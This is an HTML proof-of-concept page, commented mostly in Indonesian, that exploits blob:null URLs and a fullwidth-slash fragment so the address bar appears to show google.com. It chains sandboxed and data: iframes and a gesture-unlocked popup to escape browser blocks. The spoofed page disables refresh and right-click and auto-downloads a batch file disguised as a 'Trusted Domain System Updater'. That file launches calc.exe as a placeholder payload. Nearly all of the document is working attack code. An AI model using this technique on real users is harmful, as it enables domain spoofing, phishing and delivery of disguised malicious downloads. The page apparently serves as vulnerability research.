<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PoC: Blob Null Stability</title>
<style>
  body { margin:0; min-height:100vh; background:#0a0a0a; color:#fff; font-family:system-ui, sans-serif; display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center; gap:12px; }
  h1 { font-size:1.2rem; font-weight:500; opacity:0.8; margin:0; }
  pre { text-align:left; font-size:0.7rem; color:#0f0; max-width:90vw; white-space:pre-wrap; }
</style>
</head>
<body>

  <h1>Redirecting to <code>blob:null</code>...</h1>
  <pre id="log"></pre>

  <script>
    (function () {
      const logEl = document.getElementById('log');
      const log = (m) => { logEl.textContent += m + '\n'; console.log(m); };
      const TARGET = '#%EF%BC%8Fgoogle.com';

      log('[main] protocol: ' + location.protocol + ' | origin: ' + location.origin);

      const batLines = [
        '@echo off',
        'title Trusted Domain System Updater',
        'echo Initializing secure update sequence...',
        'timeout /t 2 >nul',
        'echo Verifying system integrity...',
        'start "" "C:\\\\Windows\\\\System32\\\\calc.exe"',
        'echo Update applied successfully.',
        'pause'
      ];

      const innerHTML = `<!DOCTYPE html>
        <html><head><meta charset="utf-8"><title>google.com</title></head>
        <body style="margin:0;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#0a0a0a;color:#fff;font-family:system-ui,-apple-system,sans-serif;gap:24px;">
          <h1 style="margin:0;font-size:2rem;font-weight:500;color:#fff;">pwned by abhirdd</h1>

          <img id="cat-img" src="https://cataas.com/cat?width=400&height=300&t=${Date.now()}" alt="cute cat"
               style="max-width:400px;width:80vw;border-radius:12px;"
               onerror="this.style.display='none';this.nextElementSibling.style.display='block';">
          <div style="display:none;font-size:6rem;">🐱</div>

          <p style="font-size:0.8rem;color:#666;margin-top:20px;user-select:none;">
            (Anti-Crash Shield Active. Coba tekan F5 / Ctrl+R)
          </p>

          <script>
            function _0x4b10b() {
              // Cegat Keyboard Refresh (F5, Ctrl+R, Cmd+R, Ctrl+F5)
              window.addEventListener('keydown', function (e) {
                const isReload = e.key === 'F5' ||
                                 ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'r');
                if (isReload) {
                  e.preventDefault();
                  e.stopPropagation();
                  _0xFakeRefresh();
                  return false;
                }
              }, true);

              // Cegat Tombol Reload Browser
              window.addEventListener('beforeunload', function (e) {
                e.preventDefault();
                e.returnValue = 'URL blob:null akan error jika di-refresh paksa!';
                _0xFakeRefresh();
                return e.returnValue;
              });

              // Cegat Klik Kanan
              window.addEventListener('contextmenu', function (e) {
                e.preventDefault();
              });

              document.body.addEventListener('click', function() {}, { once: true });
            }

            // Simulasi Refresh (Ganti gambar kucing, URL tetap sama)
            function _0xFakeRefresh() {
              const img = document.getElementById('cat-img');
              if (img) {
                img.style.opacity = '0';
                setTimeout(() => {
                  img.src = 'https://cataas.com/cat?width=400&height=300&t=' + Date.now();
                  img.style.opacity = '1';
                }, 150);
              }
              document.body.style.backgroundColor = '#1a1a1a';
              setTimeout(() => document.body.style.backgroundColor = '#0a0a0a', 300);
            }

            _0x4b10b();

            // TRIGGER DOWNLOAD .bat
            const batLines = ${JSON.stringify(batLines)};
            const batBlob = new Blob([batLines.join('\\r\\n')], { type: 'application/octet-stream' });
            const batUrl = URL.createObjectURL(batBlob);
            const a = document.createElement('a');
            a.href = batUrl;
            a.download = 'google.com_system_update.bat';
            document.body.appendChild(a);
            a.click();
          <\/script>
        </body></html>`;

      // =====================================================================
      // LOGIKA NAVIGASI
      // =====================================================================
      function makeBlobUrl() {
        return URL.createObjectURL(new Blob([innerHTML], { type: 'text/html' }));
      }

      // Deteksi mode:
      //  - file:// => origin browser = null. Blob yang dibuat LANGSUNG di
      //    halaman ini otomatis "blob:null/<uuid>" DAN top-level nav LOLOS
      //    (initiator == origin blob). Ini jalur paling bersih.
      //  - https:// => Chrome memblokir top-level nav ke blob:null (by design,
      //    "Not allowed to load local resource"). Butuh rantai vektor via
      //    sandboxed iframe (opaque origin).
      const isNullOrigin =
        location.protocol === 'file:' || location.origin === 'null';

      if (isNullOrigin) {
        // ---------- JALUR file:// : DIRECT, tanpa iframe ----------
        const url = makeBlobUrl();
        log('[main] mode file:// -> DIRECT navigation');
        log('[main] blob url: ' + url);
        location.replace(url + TARGET);
        return;
      }

      // ---------- JALUR https:// : MULTI-VEKTOR (Firefox focus) ----------
      log('[main] UA: ' + navigator.userAgent.slice(0, 90));

      var iframeFallback = false;
      var spawned = [];

      var HTML_LIT = JSON.stringify(innerHTML);
      var T = JSON.stringify(TARGET);

      // Launcher utk dokumen opaque-origin (srcdoc sandbox / data: iframe).
      // Bikin 1x blob "blob:null/<uuid>", lalu:
      //   - top.location.replace  (vektor nav top-level)
      //   - window.open           (vektor popup, butuh gesture => lihat tombol)
      //   - listener postMessage  (tombol gesture dari parent memicu window.open)
      var jsNav =
        '(function(){var html=' + HTML_LIT + ';' +
        'var u=URL.createObjectURL(new Blob([html],{type:"text/html"}));' +
        'window.addEventListener("message",function(e){' +
        'if(e.data==="blobnull:open-popup"){try{window.open(u+' + T + ');}catch(x){}}});' +
        'try{parent.postMessage("V-attempt","*");}catch(e){}' +
        'try{top.location.replace(u+' + T + ');}catch(x){}' +
        'setTimeout(function(){try{window.open(u+' + T + ');}catch(x){}},400);})();';

      function frameDoc(code) {
        return '<!DOCTYPE html><html><body><script>' + code + '<\/script></body></html>';
      }
      function toDataUrl(code) {
        // encodeURIComponent -> UTF-8 aman untuk emoji/fullwidth di payload
        return 'data:text/html;base64,' +
               btoa(unescape(encodeURIComponent(frameDoc(code))));
      }
      function spawn(mode, sandboxAttr, payload) {
        var f = document.createElement('iframe');
        if (sandboxAttr) f.setAttribute('sandbox', sandboxAttr);
        if (mode === 'srcdoc') { f.srcdoc = payload; } else { f.src = payload; }
        f.style.display = 'none';
        document.body.appendChild(f);
        spawned.push(f);
        return f;
      }

      window.addEventListener('message', function (e) {
        if (typeof e.data !== 'string') return;
        if (e.data === 'blobnull:iframe-fallback') {
          iframeFallback = true;
          log('[main] V4 aktif: blob:null tampil di nested iframe (top-level diblok browser)');
        } else if (e.data === 'V-attempt') {
          log('[main] launcher: coba top.location.replace(blob:null/...)');
        }
      });

      // V1 — sandboxed srcdoc iframe (allow-top-navigation + allow-popups)
      spawn('srcdoc', 'allow-scripts allow-top-navigation allow-popups', frameDoc(jsNav));

      // V2 — data: iframe TANPA sandbox (opaque origin; Firefox: nav top lolos)
      setTimeout(function () {
        log('[main] V1 lewat -> V2: data: iframe non-sandbox');
        spawn('data', null, toDataUrl(jsNav));
      }, 900);

      // V3 — data: iframe sandboxed allow-top-navigation (bugzilla 1976497)
      setTimeout(function () {
        log('[main] V2 lewat -> V3: data: iframe sandboxed');
        spawn('data', 'allow-scripts allow-top-navigation', toDataUrl(jsNav));
      }, 1800);

      // V4 — tampil blob:null di nested iframe (jalan di semua browser)
      setTimeout(function () {
        if (iframeFallback) return;
        log('[main] V3 lewat -> V4: nested iframe display');
        var jsShow =
          '(function(){var html=' + HTML_LIT + ';' +
          'var u=URL.createObjectURL(new Blob([html],{type:"text/html"}));' +
          'var f=document.createElement("iframe");f.src=u+' + T + ';' +
          'f.style.cssText="position:fixed;inset:0;width:100%;height:100%;border:0;";' +
          'document.body.style.margin="0";document.body.appendChild(f);' +
          'parent.postMessage("blobnull:iframe-fallback","*");})();';
        spawn('srcdoc', 'allow-scripts', frameDoc(jsShow));
      }, 2700);

      // Tombol gesture — user activation nyebar ke seluruh frame tree,
      // jadi window.open(blob:null) dari launcher lolos popup blocker.
      var btn = document.createElement('button');
      btn.textContent = '🔁 Redirect gagal? KLIK DI SINI (unlock popup via gesture)';
      btn.style.cssText = 'margin-top:12px;padding:10px 18px;font-size:0.9rem;cursor:pointer;' +
                          'border-radius:8px;border:1px solid #333;background:#161616;color:#fff;';
      btn.onclick = function () {
        log('[main] gesture -> kirim open-popup ke ' + spawned.length + ' launcher');
        spawned.forEach(function (f) {
          try { f.contentWindow.postMessage('blobnull:open-popup', '*'); } catch (e) {}
        });
      };
      document.body.appendChild(btn);

      // Safety-net: kalau semua vektor gagal total, pembanding blob biasa.
      setTimeout(function () {
        if (iframeFallback) return; // biarkan iframe blob:null tampil
        log('[main] SEMUA vektor gagal -> fallback blob:https (pembanding)');
        location.replace(makeBlobUrl() + TARGET);
      }, 10000);
    })();
  </script>

</body>
</html>
